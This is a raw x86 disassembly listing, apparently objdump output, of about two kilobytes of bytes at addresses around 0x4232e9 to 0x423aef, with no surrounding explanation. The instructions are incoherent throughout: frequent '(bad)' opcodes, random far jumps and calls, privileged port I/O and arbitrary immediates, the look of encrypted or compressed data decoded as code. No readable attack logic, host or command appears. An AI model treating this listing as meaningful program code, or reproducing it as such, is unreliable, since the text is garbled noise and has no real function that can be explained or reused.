  4232e9:	adc    eax,0x2bc10c9a
  4232ee:	inc    edi
  4232ef:	(bad)  
  4232f0:	xor    BYTE PTR [ecx],bl
  4232f2:	arpl   WORD PTR [edi-0x4aea3170],bx
  4232f8:	or     al,0xc1
  4232fa:	cmp    eax,DWORD PTR [edi-0x3a]
  4232fd:	sbb    bh,BYTE PTR [ebx+0x3b18a9b9]
  423303:	cmp    BYTE PTR [ebx+ecx*4],al
  423306:	xchg   ecx,eax
  423307:	(bad)  
  423308:	jno    0x423338
  42330a:	and    ebp,DWORD PTR [ebp+0x400fbef6]
  423310:	dec    edi
  423311:	mov    DWORD PTR [ebp+0x222a3d76],edi
  423317:	mov    edx,0x1cf6a598
  42331c:	push   esp
  42331d:	sub    ah,BYTE PTR [ebx+0x509a8e3f]
  423323:	in     al,0x30
  423325:	les    edx,FWORD PTR ds:[eax+0x2b]
  423329:	xchg   ebp,eax
  42332a:	js     0x42335f
  42332c:	ds cld 
  42332e:	not    BYTE PTR [ebx+0x77]
  423331:	push   eax
  423332:	or     DWORD PTR [eax],edi
  423334:	(bad)  
  423335:	outs   dx,DWORD PTR ds:[esi]
  423336:	sub    edi,DWORD PTR [ebx+edi*1+0x60]
  42333a:	es xchg ecx,eax
  42333c:	imul   eax,DWORD PTR [ecx],0xffffffbd
  42333f:	dec    ebp
  423340:	popf   
  423341:	out    dx,al
  423342:	push   cs
  423343:	or     DWORD PTR [eax+ebx*4-0x2fd0f754],ecx
  42334a:	mov    edi,0xc516050f
  42334f:	iret   
  423350:	push   0xffffffc2
  423352:	add    esp,edx
  423354:	xchg   BYTE PTR [ecx+0x4b],ah
  423357:	(bad)  
  423358:	cmp    eax,0x7352d975
  42335d:	mov    ebx,gs
  42335f:	jl     0x42335c
  423361:	cld    
  423362:	and    DWORD PTR [edx],esp
  423364:	nop
  423365:	xchg   dl,bl
  423367:	std    
  423368:	sbb    BYTE PTR [esi],bl
  42336a:	adc    bl,BYTE PTR [esi-0x27]
  42336d:	call   0x8dd9f595
  423372:	mov    bl,0xc1
  423374:	dec    eax
  423375:	js     0x4233f1
  423377:	das    
  423378:	sahf   
  423379:	add    al,0x48
  42337b:	and    edi,esp
  42337d:	xor    eax,0xb03437e5
  423382:	or     BYTE PTR [edi-0x5f],bl
  423385:	dec    edi
  423386:	shl    BYTE PTR [edx],cl
  423388:	nop
  423389:	test   al,0x8b
  42338b:	test   esp,esp
  42338d:	repnz popa 
  42338f:	xor    BYTE PTR [esi+ecx*1-0x18de3529],ah
  423396:	gs icebp 
  423398:	std    
  423399:	dec    ebp
  42339a:	std    
  42339b:	mov    al,ds:0x8b94fb67
  4233a0:	stc    
  4233a1:	ds jmp 0x84e0:0xcd29b09a
  4233a9:	sub    esi,eax
  4233ab:	cmovg  esi,edx
  4233ae:	and    DWORD PTR [ebx+0x7748bd2f],ebp
  4233b4:	lahf   
  4233b5:	sti    
  4233b6:	loop   0x423398
  4233b8:	xor    bl,BYTE PTR [esp+ebx*1]
  4233bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233bc:	enter  0x89fe,0x65
  4233c0:	xchg   edi,eax
  4233c1:	leave  
  4233c2:	mov    bh,0xc6
  4233c4:	(bad)  
  4233c6:	iret   
  4233c7:	inc    edx
  4233c8:	xlat   BYTE PTR ds:[ebx]
  4233c9:	std    
  4233ca:	pop    ds
  4233cb:	jne    0x4233f7
  4233cd:	push   ebx
  4233ce:	test   eax,0xd99cc90c
  4233d3:	outs   dx,BYTE PTR ds:[esi]
  4233d4:	into   
  4233d5:	fcom   DWORD PTR [ebx+0x9566aba]
  4233db:	dec    ebx
  4233dc:	hlt    
  4233dd:	pop    esp
  4233de:	mov    ch,0x17
  4233e0:	mov    bl,0x41
  4233e2:	dec    ebx
  4233e3:	jmp    0xcbeb:0x8202d470
  4233ea:	push   0xffffffa5
  4233ec:	js     0x423404
  4233ee:	shr    DWORD PTR [edi-0x6e],0x90
  4233f2:	inc    ecx
  4233f3:	inc    edi
  4233f4:	jle    0x42337c
  4233f6:	cli    
  4233f7:	mov    ebx,0x1516b960
  4233fc:	daa    
  4233fd:	push   0xffffffe4
  4233ff:	add    bl,BYTE PTR [edx+eax*1]
  423402:	jg     0x423429
  423404:	xchg   edi,eax
  423405:	(bad)  
  423407:	sbb    BYTE PTR [edx+edi*8-0x132603c0],0xa1
  42340f:	mov    BYTE PTR [edi-0xe],cl
  423412:	sub    DWORD PTR cs:[esi],0xb8d6e304
  423419:	test   eax,0x61d98dd5
  42341e:	and    al,0x88
  423420:	pop    ecx
  423421:	jno    0x42346c
  423423:	out    dx,al
  423424:	xor    BYTE PTR [edi+0x5e],cl
  423427:	jg     0x423406
  423429:	loopne 0x423451
  42342b:	mov    al,BYTE PTR [esi-0xc6f0f03]
  423431:	in     eax,dx
  423432:	pop    ebp
  423433:	ja     0x4233e8
  423435:	(bad)  
  423437:	cmp    ch,BYTE PTR ds:0x9dc30788
  42343d:	dec    esp
  42343e:	xchg   ebx,eax
  42343f:	sub    BYTE PTR [edi],0x36
  423442:	ds adc eax,0x693bcd5f
  423448:	cli    
  423449:	pop    esi
  42344a:	cdq    
  42344b:	pop    ss
  42344c:	pusha  
  42344d:	mov    ah,0x3b
  42344f:	dec    esi
  423450:	mov    edi,0xed896692
  423455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423456:	pop    ebx
  423457:	push   0x37e4c657
  42345c:	push   es
  42345d:	cld    
  42345e:	and    DWORD PTR [eax+0x2c],0x4c
  423462:	jp     0x42348d
  423464:	xchg   edi,eax
  423465:	sub    eax,0x3d99f520
  42346a:	test   DWORD PTR [eax+0x29],esi
  42346d:	jmp    0x4234ca
  42346f:	scas   al,BYTE PTR es:[edi]
  423470:	jl     0x42346f
  423472:	add    BYTE PTR [ebx],cl
  423474:	cmp    edx,esi
  423476:	das    
  423477:	inc    edi
  423478:	stc    
  423479:	in     al,0x74
  42347b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42347c:	cmp    DWORD PTR [ebx-0x5a],edi
  42347f:	mov    ecx,DWORD PTR [edi+0x7a]
  423482:	mov    ch,0x2f
  423484:	in     al,0xf1
  423486:	add    dh,BYTE PTR [ebx]
  423488:	push   ds
  423489:	imul   esi,DWORD PTR [ebx-0x7406c38],0x1f
  423490:	push   edi
  423491:	sahf   
  423492:	stos   BYTE PTR es:[edi],al
  423493:	sub    BYTE PTR [eax],bl
  423495:	jae    0x423483
  423497:	xchg   edi,ebp
  423499:	add    BYTE PTR [esi-0x4eb37130],dl
  42349f:	push   ebp
  4234a0:	pop    ebp
  4234a1:	cdq    
  4234a2:	jle    0x4234a4
  4234a4:	sub    eax,0x10f2af1f
  4234a9:	inc    ebx
  4234aa:	cwde   
  4234ab:	(bad)  
  4234ac:	sbb    BYTE PTR [edi+0x45e0c452],bh
  4234b2:	mov    ds:0x30f501ab,al
  4234b7:	fucomip st,st(0)
  4234b9:	mov    edx,0xb3b4c0fa
  4234be:	outs   dx,BYTE PTR ds:[esi]
  4234bf:	mov    edi,0xe2e9e566
  4234c4:	cld    
  4234c5:	xor    ch,al
  4234c7:	les    ebx,FWORD PTR [edx-0x71b86222]
  4234cd:	cld    
  4234ce:	sbb    DWORD PTR [eax+0x7c10958f],esi
  4234d4:	pusha  
  4234d5:	lahf   
  4234d6:	fisubr DWORD PTR [ebx+0x6f]
  4234d9:	push   eax
  4234da:	jae    0x4234bb
  4234dc:	iret   
  4234dd:	outs   dx,DWORD PTR ds:[esi]
  4234de:	ds or  eax,0x3c2a38a4
  4234e4:	push   ss
  4234e5:	mov    al,ds:0xd053ca11
  4234ea:	test   eax,0xbe2d5d3f
  4234ef:	imul   ebp,DWORD PTR [eax-0x36d19263],0xfffffff7
  4234f6:	sbb    dh,ch
  4234f8:	leave  
  4234f9:	(bad)  
  4234fa:	pcmpgtb mm4,QWORD PTR [edx+0x4]
  4234fe:	add    ah,BYTE PTR [ecx-0x537ceae9]
  423504:	inc    ecx
  423505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423506:	pop    edi
  423507:	push   ss
  423508:	mov    cl,0xdb
  42350a:	pop    es
  42350b:	mov    DWORD PTR [ecx+eiz*1-0x105b1bc2],eax
  423512:	out    dx,eax
  423513:	mov    eax,0x15c5b28c
  423518:	in     eax,dx
  423519:	dec    ebx
  42351a:	sbb    al,BYTE PTR [edx-0x31]
  42351d:	mov    WORD PTR [edi],?
  42351f:	nop
  423520:	add    dh,BYTE PTR [edi-0x4c]
  423523:	add    ecx,DWORD PTR [ebp+0x7609d043]
  423529:	xchg   ecx,eax
  42352a:	sub    al,BYTE PTR [ecx-0x28c3a037]
  423530:	mov    bh,0x5e
  423532:	adc    ecx,DWORD PTR [ebx+0x2b8fad73]
  423538:	push   cs
  423539:	mov    dl,0x45
  42353b:	leave  
  42353c:	adc    DWORD PTR [ebp+0x70],esp
  42353f:	push   ecx
  423540:	leave  
  423541:	mov    ebp,0xa19dc08f
  423546:	std    
  423547:	movd   mm0,DWORD PTR ds:0x6799c7f8
  42354e:	bound  edx,QWORD PTR [ebx+0x4de768e2]
  423554:	and    al,0x6
  423556:	imul   ebx,DWORD PTR [ebp-0x4bbb174f],0x1bd5b751
  423560:	lea    edx,[eax]
  423562:	pop    edi
  423563:	in     eax,0xbc
  423565:	ins    DWORD PTR es:[edi],dx
  423566:	hlt    
  423567:	inc    edi
  423568:	repnz stos BYTE PTR es:[edi],al
  42356a:	call   0x25736881
  42356f:	cli    
  423570:	repnz inc esi
  423572:	stos   BYTE PTR es:[edi],al
  423573:	repnz jmp 0xf5fa:0x57c82a9f
  42357b:	xor    al,0x89
  42357d:	mov    ds:0xed8dc996,eax
  423582:	fs pop eax
  423584:	jg     0x4235d1
  423586:	in     eax,dx
  423587:	jb     0x423518
  423589:	pop    esi
  42358a:	icebp  
  42358b:	test   BYTE PTR [edi],bh
  42358d:	sub    BYTE PTR [ebx+0x360e1c58],0x53
  423594:	and    DWORD PTR [edx+ebx*2-0x45236fe2],edi
  42359b:	pop    esp
  42359c:	rcr    BYTE PTR [eax-0x5b],1
  42359f:	mov    ds:0x78ceb43c,eax
  4235a4:	in     al,dx
  4235a5:	push   0xffffffa7
  4235a7:	mov    cl,0x61
  4235a9:	mov    dl,0x6d
  4235ab:	cmp    edx,esi
  4235ad:	jge    0x423592
  4235af:	cld    
  4235b0:	adc    eax,0xf8559dc1
  4235b5:	xchg   ecx,eax
  4235b6:	daa    
  4235b7:	dec    ecx
  4235b8:	popf   
  4235b9:	mov    dl,0x34
  4235bb:	push   edi
  4235bc:	jnp    0x423547
  4235be:	mov    eax,0x268e134c
  4235c3:	call   0x6d521db3
  4235c8:	mov    ebx,0x3b64613e
  4235cd:	dec    ecx
  4235ce:	inc    esi
  4235cf:	sbb    eax,0xe53081a7
  4235d4:	xor    DWORD PTR [edi],edi
  4235d6:	xchg   esi,eax
  4235d7:	push   cs
  4235d8:	les    eax,FWORD PTR [edi+0x40f7ed67]
  4235de:	xor    al,0xdb
  4235e0:	sbb    edx,DWORD PTR [ecx]
  4235e2:	cld    
  4235e3:	mov    esi,0x83936eb
  4235e8:	sub    DWORD PTR [edi+0x47],ecx
  4235eb:	out    dx,eax
  4235ec:	mov    edx,0x40259c14
  4235f1:	dec    ecx
  4235f2:	sub    ebx,esi
  4235f4:	dec    edi
  4235f5:	outs   dx,BYTE PTR ds:[esi]
  4235f6:	sub    BYTE PTR [ebx],cl
  4235f8:	mov    ebx,0xb6b0ee85
  4235fd:	xchg   esi,eax
  4235fe:	cmp    dl,BYTE PTR [edi+0x14]
  423601:	std    
  423602:	sbb    BYTE PTR [ebx],bl
  423604:	rol    ebx,1
  423606:	cmp    edx,DWORD PTR [ecx+0xa]
  423609:	mov    al,0xf9
  42360b:	or     al,BYTE PTR [ecx-0x1e686723]
  423611:	and    dl,BYTE PTR [esi+0x7e716ec4]
  423617:	mov    fs,WORD PTR [ebx]
  423619:	mov    al,ds:0x8e523ec7
  42361e:	or     al,0xad
  423620:	test   al,0x4b
  423622:	xor    eax,0xf63fa798
  423627:	pop    eax
  423628:	ds (bad) 
  42362a:	rcl    DWORD PTR [ebp+edi*2+0x3624b132],1
  423631:	cmp    esi,eax
  423633:	inc    eax
  423634:	mov    ?,WORD PTR [edi+0x13]
  423637:	xor    al,BYTE PTR [ebx+0x21617337]
  42363d:	and    ebp,DWORD PTR [eax]
  42363f:	dec    ebp
  423640:	pop    ss
  423641:	pushf  
  423642:	mov    cl,0x35
  423644:	pop    ecx
  423645:	int    0x92
  423647:	mov    dh,BYTE PTR [eax-0x21]
  42364a:	sub    dl,al
  42364c:	cwde   
  42364d:	and    BYTE PTR [ebp+0x54],ch
  423650:	fmulp  st(7),st
  423652:	inc    ecx
  423653:	fistp  QWORD PTR [edx+ebx*2-0x10a948f7]
  42365a:	ss push ebp
  42365c:	pop    ds
  42365d:	xchg   DWORD PTR [ebx+0x1d],edi
  423660:	xlat   BYTE PTR ds:[ebx]
  423661:	pushf  
  423662:	outs   dx,DWORD PTR ds:[esi]
  423663:	shr    esi,cl
  423665:	mov    ds:0x610e53dd,eax
  42366a:	enter  0x4dd4,0xf7
  42366e:	xor    eax,ebp
  423670:	or     eax,0x7c866583
  423675:	pop    ds
  423676:	cmp    al,0x74
  423678:	ss cs mov dh,dh
  42367c:	sbb    DWORD PTR [ebx-0x67b93ffd],0x5a485695
  423686:	mov    edx,0xc068c11f
  42368b:	jp     0x4236a2
  42368d:	add    DWORD PTR [edi],esi
  42368f:	das    
  423690:	inc    esp
  423691:	add    dl,BYTE PTR [esp+ecx*4-0x32ef2851]
  423698:	fcomp  DWORD PTR [ecx]
  42369a:	xchg   BYTE PTR [ebp+0x30],bh
  42369d:	ds and eax,0xed8dda9b
  4236a3:	mov    al,ds:0x9cae451f
  4236a8:	jecxz  0x423726
  4236aa:	sahf   
  4236ab:	inc    edi
  4236ac:	shl    DWORD PTR ds:0x9f4cda9e,cl
  4236b2:	xchg   edx,eax
  4236b3:	sahf   
  4236b4:	inc    eax
  4236b5:	dec    esp
  4236b6:	outs   dx,BYTE PTR ds:[esi]
  4236b7:	in     al,0xd8
  4236b9:	pusha  
  4236ba:	ror    DWORD PTR [esp-0x2f5ea1e9],0x8e
  4236c2:	and    ecx,DWORD PTR [edx-0x6e5d1f6a]
  4236c8:	shl    al,cl
  4236ca:	mov    eax,0xc8d084e6
  4236cf:	adc    BYTE PTR [eax],ch
  4236d1:	rcr    BYTE PTR [ebp-0x6e],cl
  4236d4:	stos   BYTE PTR es:[edi],al
  4236d5:	pop    DWORD PTR [edi+0x557ab597]
  4236db:	sahf   
  4236dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236dd:	daa    
  4236de:	pop    ds
  4236df:	loopne 0x423689
  4236e1:	jbe    0x4236c2
  4236e3:	repnz imul edx,DWORD PTR [eax+0x10fb0ddc],0x65f6f10e
  4236ee:	ja     0x42372f
  4236f0:	gs jle 0x4236a2
  4236f3:	jne    0x423749
  4236f5:	ror    esp,cl
  4236f7:	call   0xb465:0x3e86e3d3
  4236fe:	in     al,0x6b
  423700:	jne    0x423694
  423702:	fs in  eax,dx
  423704:	mov    bl,0x1a
  423706:	jecxz  0x423739
  423708:	add    esi,edi
  42370a:	rcl    eax,1
  42370c:	inc    ebx
  42370d:	xchg   esi,eax
  42370e:	fsubp  st(2),st
  423710:	shr    edi,cl
  423712:	aad    0x45
  423714:	into   
  423715:	cmp    BYTE PTR [edi-0x444f4991],ch
  42371b:	(bad)
  42371f:	xor    DWORD PTR [esi+edx*4],esp
  423722:	mov    al,0xb8
  423724:	pop    ss
  423725:	cmp    ah,BYTE PTR [edi-0x201eea2a]
  42372b:	and    edi,esp
  42372d:	jmp    0x74c529f0
  423732:	into   
  423733:	pop    esi
  423734:	push   ebx
  423735:	jnp    0x4236c8
  423737:	repz gs push ecx
  42373a:	aaa    
  42373b:	pop    eax
  42373c:	and    eax,DWORD PTR [esi-0x501cdcaa]
  423742:	stos   DWORD PTR es:[edi],eax
  423743:	fisubr DWORD PTR [esp]
  423746:	or     bh,BYTE PTR [ebx*4-0x8d77b7c]
  42374d:	jp     0x423723
  42374f:	rol    BYTE PTR [edx-0x3acc7ad3],cl
  423755:	xchg   ecx,eax
  423756:	mov    esp,DWORD PTR [esi-0x67]
  423759:	stc    
  42375a:	pop    ss
  42375b:	out    0x42,al
  42375d:	(bad)  
  42375e:	bound  ecx,QWORD PTR [eax-0x3b586825]
  423764:	mov    bh,0xf3
  423766:	cld    
  423767:	aam    0xf2
  423769:	sbb    esp,DWORD PTR [ebx-0x80]
  42376c:	inc    BYTE PTR [edx+0x2]
  42376f:	cmp    esp,DWORD PTR [ebp-0x7ec1fb66]
  423775:	btr    DWORD PTR [eax+0x6],edi
  423779:	adc    ebx,DWORD PTR [ecx]
  42377b:	and    dl,BYTE PTR [ecx+0x24]
  42377e:	jl     0x4237d0
  423780:	inc    ebx
  423781:	ins    BYTE PTR es:[edi],dx
  423782:	add    dh,BYTE PTR [ebp-0x4]
  423785:	int3   
  423786:	outs   dx,BYTE PTR ds:[esi]
  423787:	dec    ecx
  423788:	popf   
  423789:	mov    esi,es
  42378b:	fcom   QWORD PTR [eax+edx*1+0x43a711c7]
  423792:	inc    esi
  423793:	fld    QWORD PTR [ecx+0x4d372dd4]
  423799:	pop    edi
  42379a:	fmul   st,st(2)
  42379c:	imul   esp,DWORD PTR [edi],0x1f
  42379f:	test   BYTE PTR [esi+0x43499272],bh
  4237a5:	inc    esp
  4237a6:	pop    ss
  4237a7:	or     eax,0xd7d8fc79
  4237ac:	sbb    edi,esp
  4237ae:	inc    eax
  4237af:	addr16 aad 0xe9
  4237b2:	icebp  
  4237b3:	sub    cl,dh
  4237b5:	mov    al,BYTE PTR [ebp+eax*4+0x19]
  4237b9:	test   BYTE PTR [ebx],0x6a
  4237bc:	and    dl,bl
  4237be:	inc    esp
  4237bf:	fbld   TBYTE PTR [edi+0x51]
  4237c2:	jmp    0xe3cf:0xc8909669
  4237c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237ca:	in     eax,dx
  4237cb:	(bad)  
  4237cc:	jp     0x423780
  4237ce:	cmp    eax,0xf7c2dad1
  4237d3:	adc    ah,BYTE PTR [esi+0x191f7e5e]
  4237d9:	and    edx,DWORD PTR [edx]
  4237db:	xor    edi,DWORD PTR [edx+edx*2-0x1736306d]
  4237e2:	cmp    ah,ah
  4237e4:	push   esi
  4237e5:	inc    edi
  4237e6:	lods   eax,DWORD PTR ds:[esi]
  4237e7:	jle    0x42378d
  4237e9:	adc    eax,0x15369b79
  4237ee:	xlat   BYTE PTR ds:[ebx]
  4237ef:	or     DWORD PTR [ebx+0x3dbf891d],ebx
  4237f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237f6:	jge    0x423840
  4237f8:	adc    dl,BYTE PTR [edx]
  4237fa:	xchg   edx,eax
  4237fb:	leave  
  4237fc:	and    BYTE PTR [bx+si],al
  4237ff:	or     ebx,esi
  423801:	aam    0xcd
  423803:	sahf   
  423804:	fs jb  0x423820
  423807:	cmp    esi,DWORD PTR [edi-0x1]
  42380a:	dec    DWORD PTR [edx]
  42380c:	test   eax,0x88e60bc2
  423811:	mov    cl,0xb1
  423813:	cs jbe 0x42381a
  423816:	mov    ch,BYTE PTR [eax+0x43ee0c7a]
  42381c:	dec    ebp
  42381d:	jle    0x423838
  42381f:	sahf   
  423820:	and    DWORD PTR [eax],edx
  423822:	cmp    BYTE PTR [eax],dh
  423824:	aad    0x4
  423826:	ror    BYTE PTR [ebx],1
  423828:	dec    ecx
  423829:	fmul   QWORD PTR [edi]
  42382b:	or     bh,BYTE PTR [ebp-0x40fb8746]
  423831:	ret    
  423832:	js     0x4237d7
  423834:	mov    dl,0xf8
  423836:	das    
  423837:	mov    eax,edx
  423839:	mov    esi,ebx
  42383b:	dec    esi
  42383c:	pop    eax
  42383d:	mov    ebx,DWORD PTR [edx+0xa]
  423840:	mov    esp,0x77ff8464
  423845:	add    al,cl
  423847:	push   ebx
  423848:	into   
  423849:	mov    dh,0x88
  42384b:	xor    DWORD PTR [eax-0x35114be],edi
  423851:	inc    ecx
  423852:	es or  al,0xa0
  423855:	add    al,BYTE PTR [ecx-0x40d9658f]
  42385b:	xchg   edi,eax
  42385c:	or     ebp,DWORD PTR [ebx+0x61b4105e]
  423862:	jae    0x4238de
  423864:	es int 0xe6
  423867:	jmp    0x76c4d946
  42386c:	adc    dh,BYTE PTR [esi+ebx*4+0x13]
  423870:	repz push 0x5d
  423873:	imul   ecx,DWORD PTR [ebx],0x49ecab42
  423879:	cli    
  42387a:	xchg   ebp,eax
  42387b:	cli    
  42387c:	or     DWORD PTR [edi-0x51a6dd10],ecx
  423882:	mov    eax,ds:0xfaba8091
  423887:	popf   
  423888:	jb     0x42387e
  42388a:	xor    bh,0x8f
  42388d:	jo     0x4238cd
  42388f:	lahf   
  423890:	call   0xecdf:0xe2224e5f
  423897:	xor    bh,BYTE PTR [edi-0x3dc98346]
  42389d:	dec    ebp
  42389e:	sub    ebx,esp
  4238a0:	xor    DWORD PTR [esi],edx
  4238a2:	push   esp
  4238a3:	or     al,0x7f
  4238a5:	jmp    0x42383a
  4238a7:	jno    0x42388b
  4238a9:	test   al,0x33
  4238ab:	int3   
  4238ac:	es ss std 
  4238af:	or     al,0xfa
  4238b1:	mov    esp,0x631109d2
  4238b6:	fxch   st(7)
  4238b8:	in     eax,0x25
  4238ba:	mov    bh,BYTE PTR [edi]
  4238bc:	lods   al,BYTE PTR ds:[esi]
  4238bd:	pop    ebx
  4238be:	and    BYTE PTR [esi+0x552e1d17],al
  4238c4:	aaa    
  4238c5:	xor    ch,BYTE PTR [edx+edx*1-0x75]
  4238c9:	mov    edi,0x99f17dbf
  4238ce:	and    bh,BYTE PTR [ecx-0x49a15802]
  4238d4:	ror    BYTE PTR [ecx],0x93
  4238d7:	test   al,0xe2
  4238d9:	pop    es
  4238da:	outs   dx,BYTE PTR ds:[esi]
  4238db:	fbld   TBYTE PTR ds:0x771f1542
  4238e1:	loopne 0x42391a
  4238e3:	cmp    eax,0x140d54a9
  4238e8:	xor    al,0xa9
  4238ea:	lock in al,0x87
  4238ed:	add    eax,0x315a17e
  4238f2:	or     ch,al
  4238f4:	out    0x23,al
  4238f6:	adc    eax,0xb0070a22
  4238fb:	mov    al,0xd7
  4238fd:	dec    ecx
  4238fe:	jb     0x4238d0
  423900:	outs   dx,DWORD PTR ds:[esi]
  423901:	enter  0xee40,0x5e
  423905:	xchg   ebp,eax
  423906:	adc    eax,0x652ab141
  42390b:	jmp    0x42396e
  42390d:	wbinvd 
  42390f:	cmc    
  423910:	push   esi
  423911:	mov    edi,0xc531e528
  423916:	jne    0x423934
  423918:	push   ds
  423919:	test   BYTE PTR [eax+0x23],dh
  42391c:	sar    BYTE PTR [edx-0x7fdc782e],1
  423922:	xor    al,0x7c
  423924:	xchg   esp,eax
  423925:	das    
  423926:	mov    DWORD PTR [ecx],ecx
  423928:	rcr    BYTE PTR [edx+0xce61ad6],1
  42392e:	add    ch,0x3
  423931:	std    
  423932:	js     0x4239a7
  423934:	in     al,0x7d
  423936:	test   BYTE PTR [edx+0x14],ah
  423939:	pop    eax
  42393a:	cmp    esi,ebp
  42393c:	std    
  42393d:	cli    
  42393e:	(bad)  [ebp-0x41]
  423941:	mov    ecx,0xecdeb32
  423946:	xchg   edx,eax
  423947:	mov    WORD PTR [ecx],?
  423949:	arpl   WORD PTR [esi],ax
  42394b:	test   DWORD PTR [eax-0x3e],ecx
  42394e:	add    ebx,DWORD PTR [edi-0x6bcb81c3]
  423954:	pop    ebx
  423955:	adc    dl,BYTE PTR [eax]
  423957:	adc    ebp,DWORD PTR [esi+eax*2]
  42395a:	les    esp,FWORD PTR [ebp-0x1c6203cc]
  423960:	add    eax,0x4a0e81fc
  423965:	aaa    
  423966:	ins    DWORD PTR es:[edi],dx
  423967:	xor    al,0xb5
  423969:	adc    ecx,esp
  42396b:	and    DWORD PTR [edx],ecx
  42396d:	sub    dh,al
  42396f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423970:	xchg   edi,eax
  423971:	scas   al,BYTE PTR es:[edi]
  423972:	mov    BYTE PTR [ebx-0x309c52c6],bl
  423978:	fs popf 
  42397a:	xor    esp,DWORD PTR [ebx+0x7]
  42397d:	rol    BYTE PTR fs:[esi+eax*4+0x3c],1
  423982:	mov    bp,0xe47e
  423986:	mov    al,ds:0x5084fb77
  42398b:	pusha  
  42398c:	cli    
  42398d:	push   ss
  42398e:	cwde   
  42398f:	xchg   ebx,eax
  423990:	push   ss
  423991:	rcl    BYTE PTR [edx-0x25ee4649],cl
  423997:	rcl    DWORD PTR [edi-0x67],1
  42399a:	xchg   ebp,eax
  42399b:	pminsw mm4,QWORD PTR [edx-0x3221a4ea]
  4239a2:	fnstsw WORD PTR [esi+ebx*1-0x38]
  4239a6:	mov    ch,0x90
  4239a8:	(bad)  
  4239a9:	in     al,0x27
  4239ab:	sub    dl,bl
  4239ad:	sbb    al,0x7d
  4239af:	imul   eax,ecx,0x11d00b9c
  4239b5:	in     al,0xd4
  4239b7:	mov    dh,0x45
  4239b9:	jmp    DWORD PTR [esi]
  4239bb:	inc    ecx
  4239bc:	push   0x356a2415
  4239c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239c2:	sbb    DWORD PTR [ebx+eax*1],eax
  4239c5:	repnz loopne 0x4239f8
  4239c8:	jp     0x4239a4
  4239ca:	xor    DWORD PTR [edx-0x288315ca],esp
  4239d0:	push   ecx
  4239d1:	cmc    
  4239d2:	or     eax,0x223ec0c6
  4239d7:	and    al,0x71
  4239d9:	jbe    0x423992
  4239db:	icebp  
  4239dc:	push   0xffffffe9
  4239de:	mov    ch,0x24
  4239e0:	into   
  4239e1:	jle    0x4239d2
  4239e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239e4:	dec    ecx
  4239e5:	cdq    
  4239e6:	or     bh,0xa5
  4239e9:	pusha  
  4239ea:	dec    eax
  4239eb:	inc    edx
  4239ec:	or     bl,BYTE PTR [eax+0x3b338fbe]
  4239f2:	mov    edx,0x891fda93
  4239f7:	dec    edx
  4239f8:	or     edx,ebp
  4239fa:	inc    edi
  4239fb:	cmp    ebx,DWORD PTR [eax]
  4239fd:	lahf   
  4239fe:	cmp    eax,0xa8c556b9
  423a03:	sub    DWORD PTR [ecx+0x28],edx
  423a06:	ins    BYTE PTR es:[edi],dx
  423a07:	repz pushf 
  423a09:	xlat   BYTE PTR ds:[ebx]
  423a0a:	loope  0x4239b2
  423a0c:	icebp  
  423a0d:	test   al,0x8a
  423a0f:	loope  0x423a88
  423a11:	jno    0x423996
  423a13:	jo     0x4239bd
  423a15:	mov    esp,0x29eae189
  423a1a:	sbb    al,dl
  423a1c:	ss sub ebx,ebx
  423a1f:	add    eax,0x4173c24c
  423a24:	repnz cwde 
  423a26:	inc    esp
  423a27:	arpl   dx,sp
  423a29:	fs inc edx
  423a2b:	xlat   BYTE PTR ds:[ebx]
  423a2c:	enter  0xd3f7,0x4a
  423a30:	xchg   esi,eax
  423a31:	inc    ebx
  423a32:	cdq    
  423a33:	mov    esp,0xbafd58d
  423a38:	pop    ebx
  423a39:	dec    eax
  423a3a:	sbb    ch,BYTE PTR [ecx-0x2cdde71c]
  423a40:	cli    
  423a41:	addr16 add esp,esp
  423a44:	mov    WORD PTR [ebp+0x6617f048],cs
  423a4a:	and    DWORD PTR [eax+0x4c],esi
  423a4d:	lods   eax,DWORD PTR ds:[esi]
  423a4e:	mov    eax,ds:0x797a1c70
  423a53:	into   
  423a54:	retf   0xa74b
  423a57:	call   0xd353fbb6
  423a5c:	pop    ecx
  423a5d:	jmp    0x7fb0967e
  423a62:	dec    esp
  423a63:	push   ss
  423a64:	xchg   esp,eax
  423a65:	rcl    DWORD PTR [ebp+0x502cd796],0xb3
  423a6c:	inc    esp
  423a6d:	dec    DWORD PTR [ebp+0x55765a99]
  423a73:	pop    esi
  423a74:	and    edx,esi
  423a76:	mov    ah,0xb
  423a78:	jne    0x423a23
  423a7a:	daa    
  423a7b:	dec    ebx
  423a7c:	cdq    
  423a7d:	mov    ebx,0xee89ad9f
  423a82:	in     eax,0x2
  423a84:	cmp    ecx,DWORD PTR [edx]
  423a86:	mov    ecx,0xf1c776d7
  423a8b:	fadd   st,st(0)
  423a8d:	jmp    0x183d1e3a
  423a92:	mov    ds:0x43b3729d,al
  423a97:	push   edx
  423a98:	arpl   bx,si
  423a9a:	arpl   WORD PTR [ecx+esi*4+0x6d92d436],bp
  423aa1:	mov    ecx,0xe9fe270
  423aa6:	cwde   
  423aa7:	scas   eax,DWORD PTR es:[edi]
  423aa8:	cs inc ebx
  423aaa:	nop
  423aab:	jns    0x423a62
  423aad:	pop    ds
  423aae:	es out 0x8e,al
  423ab1:	sbb    ch,BYTE PTR [ebx+0x5c918413]
  423ab7:	ror    DWORD PTR [esi+0x432b03ba],cl
  423abd:	sub    eax,0xd2e7b7e6
  423ac2:	inc    edx
  423ac3:	fild   DWORD PTR [edi+ebx*8-0x1c]
  423ac7:	js     0x423ae3
  423ac9:	(bad)  
  423aca:	repnz les eax,FWORD PTR [ebp+0x5f23aeb9]
  423ad1:	fnsave [ecx-0x706a0215]
  423ad7:	jne    0x423b4c
  423ad9:	add    dl,0xa5
  423adc:	fiadd  WORD PTR [eax+0xa6a57e9]
  423ae2:	mov    bl,0x1f
  423ae4:	enter  0x4b50,0x9
  423ae8:	add    cl,al
  423aea:	bound  edi,QWORD PTR [eax]
  423aec:	or     dh,BYTE PTR [esi]
  423aee:	daa    
  423aef:	sahf   
